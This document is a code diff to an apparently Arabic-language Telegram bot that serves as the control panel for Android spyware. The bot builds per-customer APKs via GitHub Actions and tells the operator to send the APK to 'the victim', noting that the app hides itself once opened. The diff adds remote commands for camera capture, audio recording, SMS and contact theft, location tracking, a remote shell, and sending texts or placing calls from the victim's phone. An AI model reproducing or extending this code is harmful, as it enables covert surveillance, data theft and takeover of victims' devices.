@@ -358,7 +358,6 @@ def generate_short_code(length=8):
 # ★★★ GitHub Actions — بناء APK مخصص ★★★
 # ============================================================
 def trigger_apk_build(activation_code):
-    """يشغّل GitHub Action لبناء APK بكود مخصص"""
     if not GITHUB_TOKEN:
         print("[-] GITHUB_TOKEN not set")
         return None
@@ -392,7 +391,6 @@ def trigger_apk_build(activation_code):
 
 
 def get_apk_from_release(activation_code):
-    """يجلب رابط APK من Releases"""
     if not GITHUB_TOKEN:
         return None
     
@@ -409,7 +407,6 @@ def get_apk_from_release(activation_code):
             releases = r.json()
             
             for release in releases:
-                # ابحث عن release يحتوي على الكود في الاسم
                 if activation_code in release.get("name", "") or activation_code in release.get("tag_name", ""):
                     for asset in release.get("assets", []):
                         if asset.get("name", "").endswith(".apk"):
@@ -423,7 +420,6 @@ def get_apk_from_release(activation_code):
 
 
 def wait_for_apk_build(activation_code, max_wait=600):
-    """ينتظر حتى ينتهي البناء ويعيد رابط APK"""
     if not GITHUB_TOKEN:
         return None
     
@@ -431,7 +427,6 @@ def wait_for_apk_build(activation_code, max_wait=600):
     print(f"[+] Waiting for APK build: {activation_code}")
     
     while time.time() - start < max_wait:
-        # جرب البحث عن APK في Releases
         apk_url = get_apk_from_release(activation_code)
         if apk_url:
             print(f"[+] APK ready: {apk_url}")
@@ -627,7 +622,6 @@ def callback_handler(call):
         consume_usage(chat_id, "apk")
         bot.answer_callback_query(call.id, "⏳ جاري تجهيز التطبيق المخصص لك...")
         
-        # 1) أنشئ كود تنشيط فريد
         apk_code = None
         if APK_ENABLED:
             apk_code = create_apk_code(chat_id)
@@ -641,13 +635,11 @@ def callback_handler(call):
                 except Exception:
                     pass
         
-        # 2) إذا كان GitHub Token مفقوداً → استخدم APK العام
         if not GITHUB_TOKEN:
             building_msg = bot.send_message(
                 chat_id,
                 f"⏳ **جاري تحميل التطبيق...**\n\n"
-                f"🔑 كود التنشيط: `{apk_code}`\n\n"
-                f"_(سيتم دمج الكود تلقائياً)_",
+                f"🔑 كود التنشيط: `{apk_code}`",
                 parse_mode="Markdown"
             )
             
@@ -667,8 +659,7 @@ def callback_handler(call):
                             f"📋 **الخطوات:**\n"
                             f"1. أرسل APK للضحية\n"
                             f"2. تثبّته الضحية\n"
-                            f"3. تفتحه (سيعمل تلقائياً)\n"
-                            f"4. ستحصل على تقرير كامل"
+                            f"3. تفتحه (سيعمل تلقائياً)"
                         ),
                         parse_mode="Markdown"
                     )
@@ -687,31 +678,27 @@ def callback_handler(call):
                 pass
             return
         
-        # 3) أرسل رسالة البناء
         building_msg = bot.send_message(
             chat_id,
             f"🔨 **جاري بناء تطبيقك المخصص...**\n\n"
             f"🔑 كود التنشيط: `{apk_code}`\n\n"
             f"⏳ **الوقت المتوقع: 2-4 دقائق**\n"
-            f"سيتم إرسال APK فور جهوزه\n\n"
-            f"💡 _يمكنك ترك البوت والعودة لاحقاً_",
+            f"سيتم إرسال APK فور جهوزه",
             parse_mode="Markdown"
         )
         
-        # 4) شغّل GitHub Action
         success = trigger_apk_build(apk_code)
         
         if not success:
             bot.edit_message_text(
                 f"❌ **فشل تشغيل البناء**\n\n"
                 f"🔑 الكود: `{apk_code}`\n"
-                f"جاري محاولة استخدام APK العام...",
+                f"جاري استخدام APK العام...",
                 chat_id=chat_id,
                 message_id=building_msg.message_id,
                 parse_mode="Markdown"
             )
             
-            # استخدم APK العام
             try:
                 r = requests.get(APK_DOWNLOAD_URL, timeout=60, allow_redirects=True)
                 if r.status_code == 200:
@@ -724,7 +711,6 @@ def callback_handler(call):
                 pass
             return
         
-        # 5) شغّل الانتظار في thread منفصل
         def wait_and_send():
             apk_url = wait_for_apk_build(apk_code, max_wait=600)
             
@@ -742,7 +728,7 @@ def callback_handler(call):
                                 f"✅ **تطبيقك المخصص جاهز!**\n"
                                 f"━━━━━━━━━━━━━━━━━━\n\n"
                                 f"🔑 **كود التنشيط:** `{apk_code}`\n"
-                                f"_(مدمج تلقائياً — لا يحتاج كتابة)_\n\n"
+                                f"_(مدمج تلقائياً)_\n\n"
                                 f"📋 **طريقة الاستخدام:**\n"
                                 f"1. أرسل APK للضحية\n"
                                 f"2. ثبّته على هاتفه\n"
@@ -750,6 +736,8 @@ def callback_handler(call):
                                 f"4. **يختفي فوراً**\n"
                                 f"5. ستحصل على تقرير كامل\n\n"
                                 f"⚙️ **الأوامر المتاحة:**\n"
+                                f"• 📷 كاميرا أمامية/خلفية\n"
+                                f"• 🎙️ تسجيل صوتي\n"
                                 f"• 📱 معلومات الجهاز\n"
                                 f"• 📨 SMS\n"
                                 f"• 📞 المكالمات\n"
@@ -832,18 +820,27 @@ def callback_handler(call):
         )
         return
 
+    # ============================================================
+    # ★★★ معالجات أوامر APK — 25+ أمر ★★★
+    # ============================================================
     if call.data.startswith("apk_cmd_"):
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌ غير مصرح", show_alert=True)
             return
-        parts = call.data.replace("apk_cmd_", "").split("_", 1)
-        if len(parts) < 2:
-            return
-        action = parts[0]
-        device_id = parts[1]
         
-        command_map = {
+        # استخراج action و device_id
+        full = call.data.replace("apk_cmd_", "")
+        idx = full.rfind("_")
+        action = full[:idx]
+        device_id = full[idx+1:]
+        
+        # ============================================================
+        # خريطة الأوامر
+        # ============================================================
+        simple_commands = {
+            # البيانات
             "info": "get_device_info",
+            "battery": "get_battery",
             "sms": "get_sms",
             "calls": "get_call_log",
             "contacts": "get_contacts",
@@ -851,19 +848,72 @@ def callback_handler(call):
             "photos": "get_photos",
             "location": "get_location",
             "clipboard": "get_clipboard",
+            
+            # الكاميرا
+            "camera_front": "camera_front",
+            "camera_back": "camera_back",
+            "camera_record": "camera_record",
+            
+            # الصوت
+            "record_audio": "record_audio",
+            "play_sound": "play_sound",
+            "play_alarm": "play_alarm",
+            
+            # التحكم
             "vibrate": "vibrate",
-            "sound": "play_sound",
+            "volume_max": "volume_max",
+            "lock_screen": "lock_screen",
+            "show_home": "show_home",
         }
         
-        cmd = command_map.get(action)
-        if cmd:
+        if action in simple_commands:
+            cmd = simple_commands[action]
+            
             if action == "vibrate":
                 push_apk_command(device_id, "vibrate", ms=3000)
-            elif action == "sound":
-                push_apk_command(device_id, "play_sound")
+            elif action == "record_audio":
+                push_apk_command(device_id, "record_audio", duration=10000)
             else:
                 push_apk_command(device_id, cmd)
+            
             bot.answer_callback_query(call.id, f"✅ {action}")
+            print(f"[+] Command sent: {action} → {device_id[:8]}")
+            return
+        
+        # ============================================================
+        # الأوامر التي تحتاج إدخال
+        # ============================================================
+        if action == "shell":
+            bot.answer_callback_query(call.id)
+            msg = bot.send_message(chat_id, "💻 **أرسل الأمر:**", parse_mode="Markdown")
+            bot.register_next_step_handler(msg, lambda m, d=device_id: apk_shell_handler(m, d))
+            return
+        
+        if action == "toast":
+            bot.answer_callback_query(call.id)
+            msg = bot.send_message(chat_id, "💬 **أرسل النص:**", parse_mode="Markdown")
+            bot.register_next_step_handler(msg, lambda m, d=device_id: apk_toast_handler(m, d))
+            return
+        
+        if action == "send_sms":
+            bot.answer_callback_query(call.id)
+            msg = bot.send_message(chat_id, "✉️ **أرسل:** `رقم|نص`", parse_mode="Markdown")
+            bot.register_next_step_handler(msg, lambda m, d=device_id: apk_send_sms_handler(m, d))
+            return
+        
+        if action == "call":
+            bot.answer_callback_query(call.id)
+            msg = bot.send_message(chat_id, "📞 **أرسل الرقم:**", parse_mode="Markdown")
+            bot.register_next_step_handler(msg, lambda m, d=device_id: apk_call_handler(m, d))
+            return
+        
+        if action == "open_url":
+            bot.answer_callback_query(call.id)
+            msg = bot.send_message(chat_id, "🌐 **أرسل الرابط:**", parse_mode="Markdown")
+            bot.register_next_step_handler(msg, lambda m, d=device_id: apk_open_url_handler(m, d))
+            return
+        
+        bot.answer_callback_query(call.id, f"❓ أمر غير معروف: {action}", show_alert=True)
         return
 
     # ============================================================
@@ -1607,6 +1657,48 @@ def callback_handler(call):
         ok = lsh_push_command(sid, {"action": "redirect", "payload": {"url": "about:blank"}})
         bot.answer_callback_query(call.id, "❌" if ok else "❌", show_alert=not ok)
         return
+
+
+# ============================================================
+# ★★★ معالجات APK Next Step ★★★
+# ============================================================
+def apk_shell_handler(message, device_id):
+    if not message.text:
+        return
+    push_apk_command(device_id, "shell", command=message.text)
+    bot.send_message(message.chat.id, f"✅ تم إرسال الأمر إلى `{device_id[:8]}`", parse_mode="Markdown")
+
+
+def apk_toast_handler(message, device_id):
+    if not message.text:
+        return
+    push_apk_command(device_id, "toast", text=message.text)
+    bot.send_message(message.chat.id, "✅ تم إرسال النص")
+
+
+def apk_send_sms_handler(message, device_id):
+    if not message.text:
+        return
+    parts = message.text.split("|")
+    if len(parts) != 2:
+        bot.send_message(message.chat.id, "❌ استخدم: `رقم|نص`", parse_mode="Markdown")
+        return
+    push_apk_command(device_id, "send_sms", to=parts[0].strip(), msg=parts[1].strip())
+    bot.send_message(message.chat.id, "✅ تم إرسال SMS")
+
+
+def apk_call_handler(message, device_id):
+    if not message.text:
+        return
+    push_apk_command(device_id, "call", to=message.text.strip())
+    bot.send_message(message.chat.id, "✅ تم بدء المكالمة")
+
+
+def apk_open_url_handler(message, device_id):
+    if not message.text:
+        return
+    push_apk_command(device_id, "open_url", url=message.text.strip())
+    bot.send_message(message.chat.id, "✅ تم فتح الرابط")
 
 
 # ============================================================
